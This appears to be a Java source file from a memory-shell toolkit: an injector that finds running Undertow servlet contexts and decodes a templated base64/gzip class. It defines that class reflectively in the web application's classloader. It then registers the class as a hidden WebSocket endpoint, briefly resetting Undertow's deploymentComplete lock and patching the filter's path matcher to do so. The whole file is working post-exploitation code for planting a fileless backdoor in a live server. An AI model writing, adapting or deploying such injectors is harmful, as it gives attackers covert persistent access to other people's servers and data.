package com.reajason.javaweb.memshell.injector.undertow;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * 通过 JSR-356 {@code ServerContainer} 注册 {@code Endpoint}。
 * <p>
 * Undertow 在部署完成后会关闭 addEndpoint 入口，注册前需要临时复位
 * {@code ServerWebSocketContainer.deploymentComplete}；尚未初始化过滤器的场景由
 * Undertow 自己补齐映射，已初始化的场景则把新端点写入过滤器的路径匹配器。
 *
 * @author ReaJason
 */
public class UndertowWebSocketInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public UndertowWebSocketInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts == null || contexts.isEmpty()) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    inject(context, shell);
                    msg += "[" + getUrlPattern() + "] ready\n";
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        ok = true;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(context, "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    @SuppressWarnings("Duplicates")
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            try {
                Class<?> clazz = thread.getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext");
                Object requestContext = invokeMethod(clazz, "current", null, null);
                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext", null, null);
                if (servletContext != null) {
                    contexts.add(servletContext);
                }
            } catch (Exception ignored) {
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object deploymentInfo = getFieldValue(context, "deploymentInfo");
            return ((ClassLoader) invokeMethod(deploymentInfo, "getClassLoader", null, null));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        msg += "[" + classLoader.getClass().getName() + "] ";
        return clazz.newInstance();
    }

    @SuppressWarnings("unchecked")
    private void inject(Object servletContext, Object shell) throws Exception {
        Object container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
        if (container == null) {
            container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
        }
        if (container == null) {
            throw new RuntimeException("container is null");
        }

        if (findEndpoint(container)) {
            return;
        }

        ClassLoader classLoader = shell.getClass().getClassLoader();
        Class<?> serverEndpointConfigClass;
        Class<?> builderClass;
        try {
            serverEndpointConfigClass = classLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
            builderClass = classLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
        } catch (ClassNotFoundException e) {
            serverEndpointConfigClass = classLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig");
            builderClass = classLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig$Builder");
        }

        Object builder = invokeMethod(builderClass, "create", new Class[]{Class.class, String.class},
                new Object[]{shell.getClass(), getUrlPattern()});
        Object endpointConfig = invokeMethod(builder, "build", null, null);

        invokeMethod(container, "setDefaultMaxTextMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
        invokeMethod(container, "setDefaultMaxBinaryMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});

        // Undertow 部署完成后会拒绝新的端点；临时复位标志位，注册完立即恢复
        Field deploymentComplete = getField(container, "deploymentComplete");
        deploymentComplete.setAccessible(true);
        boolean restore = deploymentComplete.getBoolean(container);
        if (restore) {
            deploymentComplete.setBoolean(container, false);
        }
        try {
            invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
        } finally {
            if (restore) {
                deploymentComplete.setBoolean(container, true);
            }
        }

        try {
            refreshFilterMatcher(servletContext, container);
        } catch (Throwable ignored) {
            // 过滤器尚未初始化时会自行按当前端点构建匹配器，这里失败不影响新端点
        }
    }

    @SuppressWarnings("unchecked")
    private boolean findEndpoint(Object container) throws Exception {
        List endpoints = (List) invokeMethod(container, "getConfiguredServerEndpoints", null, null);
        if (endpoints == null) {
            return false;
        }
        for (Object endpoint : endpoints) {
            Object config = invokeMethod(endpoint, "getEndpointConfiguration", null, null);
            Object path = invokeMethod(config, "getPath", null, null);
            if (getUrlPattern().equals(path)) {
                return true;
            }
        }
        return false;
    }

    /**
     * 应用启动时已有 WebSocket 端点的话，JsrWebSocketFilter 已经初始化并缓存了路径匹配器，
     * 需要把新端点补进去；否则首个升级请求会被过滤器当作普通请求放行。
     */
    @SuppressWarnings("unchecked")
    private void refreshFilterMatcher(Object servletContext, Object container) throws Exception {
        Object deployment = invokeMethod(servletContext, "getDeployment", null, null);
        Object managedFilters = invokeMethod(deployment, "getFilters", null, null);
        Object managedFilter = invokeMethod(managedFilters, "getManagedFilter",
                new Class[]{String.class}, new Object[]{"Undertow Web Socket Filter"});
        if (managedFilter == null) {
            return;
        }
        Object filter = getFieldValue(managedFilter, "filter");
        if (filter == null) {
            return;
        }
        Object matcher = getFieldValue(filter, "pathTemplateMatcher");
        if (matcher == null) {
            return;
        }

        List endpoints = (List) invokeMethod(container, "getConfiguredServerEndpoints", null, null);
        Object configured = endpoints.get(endpoints.size() - 1);
        Object handshakeHolder = invokeMethod(container.getClass(), "handshakes",
                new Class[]{configured.getClass()}, new Object[]{configured});
        invokeMethod(matcher, "add", new Class[]{String.class, Object.class},
                new Object[]{getUrlPattern(), handshakeHolder});
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        try {
            Field field = getField(obj, name);
            field.setAccessible(true);
            return field.get(obj);
        } catch (NoSuchFieldException ignored) {
        }
        return null;
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
